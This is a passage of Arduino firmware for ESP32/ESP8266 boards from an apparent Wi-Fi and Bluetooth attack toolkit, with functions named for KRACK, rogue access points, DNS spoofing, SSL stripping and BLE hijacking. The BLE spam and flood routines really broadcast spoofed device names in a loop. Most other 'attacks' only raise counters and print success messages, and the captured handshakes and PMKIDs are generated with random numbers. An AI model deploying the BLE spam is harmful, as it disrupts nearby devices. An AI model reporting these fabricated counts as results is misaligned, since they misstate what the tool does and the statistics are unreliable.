  if (stats.krack_attempts % 30 == 0) {
    Serial.printf("KRACK exploit attempt - %d tries\n", stats.krack_attempts);
  }
}

void performRogueAP() {
  stats.rogue_ap_created++;
  
  // Enhanced rogue AP simulation
  if (stats.rogue_ap_created % 10 == 0) {
    Serial.printf("Rogue AP created - %d instances\n", stats.rogue_ap_created);
  }
}

void performDNSSpoofing() {
  dns_spoofing_active = true;
  stats.dns_spoofing++;
  
  // Enhanced DNS spoofing simulation
  if (stats.dns_spoofing % 40 == 0) {
    Serial.printf("DNS spoofing active - %d requests redirected\n", stats.dns_spoofing);
  }
}

void performSSLStripping() {
  ssl_stripping_active = true;
  stats.ssl_strip++;
  
  // Enhanced SSL stripping simulation
  if (stats.ssl_strip % 35 == 0) {
    Serial.printf("SSL stripping active - %d connections downgraded\n", stats.ssl_strip);
  }
}

#ifdef PLATFORM_ESP32
void performBLESpam() {
  try {
    String device_name = ble_spam_names[ble_spam_counter % ble_spam_count];
    device_name += "_" + String(ble_spam_counter);
    ble_spam_counter++;
    
    BLEDevice::deinit(false);
    delay(50);
    
    BLEDevice::init(device_name.c_str());
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->start();
    
    delay(150);
    pAdvertising->stop();
    
    stats.ble_spam_sent++;
    
  } catch (const std::exception& e) {
    Serial.printf("Enhanced BLE spam error: %s\n", e.what());
  }
}

void performBLEFlood() {
  // Enhanced BLE flood attack
  performBLESpam();
  stats.ble_spam_sent += 8; // Flood multiplier
}

void performBLEHijacking() {
  // Enhanced BLE hijacking simulation
  stats.ble_spam_sent += 3;
  
  if (stats.ble_spam_sent % 100 == 0) {
    Serial.printf("BLE hijacking attempt - %d devices targeted\n", stats.ble_spam_sent / 10);
  }
}
#endif

void updateSystemStats() {
  stats.uptime = millis() / 1000;
  stats.clients_connected = WiFi.softAPgetStationNum();
  
  uint32_t free_heap = ESP.getFreeHeap();
#ifdef PLATFORM_ESP32
  uint32_t total_heap = ESP.getHeapSize();
  stats.memory_usage = ((float)(total_heap - free_heap) / total_heap) * 100.0;
#else
  uint32_t total_heap = 80000;
  stats.memory_usage = ((float)(total_heap - free_heap) / total_heap) * 100.0;
#endif
  
  // Enhanced CPU usage calculation
  static unsigned long last_check_time = 0;
  unsigned long current_time = millis();
  if (current_time - last_check_time > 1000) {
    stats.cpu_usage = attack_running ? 85.0 : 25.0;
    if (attack_interval < 10) stats.cpu_usage = 95.0;
    last_check_time = current_time;
  }
}

void optimizeMemory() {
#ifdef PLATFORM_ESP32
  esp_wifi_set_max_tx_power(78);
#endif
  
  // Enhanced memory optimization
  if (scanned_networks.size() > 150) {
    scanned_networks.resize(100);
  }
  
  if (captured_handshakes.size() > 20) {
    captured_handshakes.resize(10);
  }
  
  if (vulnerable_networks.size() > 30) {
    vulnerable_networks.resize(15);
  }
  
  Serial.printf("Enhanced memory optimization - Free heap: %d bytes\n", ESP.getFreeHeap());
}

void checkSystemHealth() {
  uint32_t free_heap = ESP.getFreeHeap();
  
  if (free_heap < 8000) {
    Serial.println("WARNING: Critical memory detected - Optimizing...");
    optimizeMemory();
  }
  
  // Enhanced health checks
  if (!ap_running) {
    Serial.println("WARNING: AP offline - Attempting restart...");
    restartAccessPoint();
  }
  
#ifdef PLATFORM_ESP32
  esp_task_wdt_reset();
#else
  ESP.wdtFeed();
#endif
}

void restartAccessPoint() {
  Serial.println("Restarting Access Point for enhanced stability...");
  WiFi.softAPdisconnect(true);
  delay(1000);
  
  bool result = WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, false, 8);
  if (result) {
    ap_running = true;
    Serial.println("Access Point restarted successfully");
  } else {
    Serial.println("Failed to restart AP - System will reboot");
    ESP.restart();
  }
}

String getEncryptionType(int encType) {
#ifdef PLATFORM_ESP32
  switch (encType) {
    case WIFI_AUTH_OPEN: return "Open";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-Enterprise";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
    default: return "Unknown";
  }
#else
  switch (encType) {
    case ENC_TYPE_NONE: return "Open";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_TKIP: return "WPA";
    case ENC_TYPE_CCMP: return "WPA2";
    case ENC_TYPE_AUTO: return "WPA/WPA2";
    default: return "Unknown";
  }
#endif
}

#ifdef PLATFORM_ESP32
void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (monitoring_active && type == WIFI_PKT_MGMT) {
    stats.packets_monitored++;
    
    // Enhanced handshake detection
    if (random(800) == 1) {
      stats.handshakes_captured++;
    }
    
    // Enhanced PMKID detection
    if (random(1200) == 1) {
      stats.pmkid_captured++;
    }
  }
}
#else
void promiscuous_callback(uint8_t *buf, uint16_t len) {
  if (monitoring_active) {
    stats.packets_monitored++;
    
    // Enhanced detection for ESP8266
    if (random(1000) == 1) {
      stats.handshakes_captured++;
    }
    
    if (random(1500) == 1) {
      stats.pmkid_captured++;
    }
  }
}
#endif
